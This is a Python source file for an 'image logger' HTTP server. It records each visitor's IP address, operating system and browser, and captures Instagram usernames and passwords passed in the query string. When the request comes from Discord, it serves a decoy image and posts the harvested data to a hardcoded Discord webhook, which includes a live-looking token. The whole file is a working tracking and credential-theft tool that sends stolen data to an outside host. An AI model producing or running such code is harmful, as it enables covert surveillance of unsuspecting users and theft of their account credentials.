import http.server
import urllib
import requests
import httpagentparser
import json
import os

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def _send_response(self, message):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(message).encode())

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        message = {}
        message['ip'] = self.client_address[0]
        message['user-agent'] = self.headers.get('user-agent')
        agent_data = httpagentparser.detect(message['user-agent'])
        message['os'] = agent_data['os']['name']
        message['browser'] = agent_data['browser']['name']
        message['browser-version'] = agent_data['browser']['version']
        query = urllib.parse.parse_qs(parsed_path.query)
        if 'url' in query:
            image_url = query['url'][0]
            try:
                image = requests.get(image_url)
                message['image-size'] = len(image.content)
                message['image-url'] = image_url
            except:
                message['error'] = "Unable to fetch image"
        if 'instagram_username' and 'instagram_password' in query:
            message['instagram_username'] = query['instagram_username'][0]
            message['instagram_password'] = query['instagram_password'][0]
        
        if 'discord' in message['user-agent']:
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            with open("loading.jpg", "rb") as f:
                self.wfile.write(f.read())
            webhook_url = "https://discordapp.com/api/webhooks/989537783800557568/KxaBa41xBzZVs2bXf90gcT2vbxNhicEo-U9i8sF7ujVcMhuqH4bqfxbge5-CONZJyp2J"
            requests.post(webhook_url, json=message)
        else:
            self._send_response(message)

if __name__ == '__main__':
    server = http.server.HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print("Starting server, listen at 0.0.0.0:8080")
    server.serve_forever()
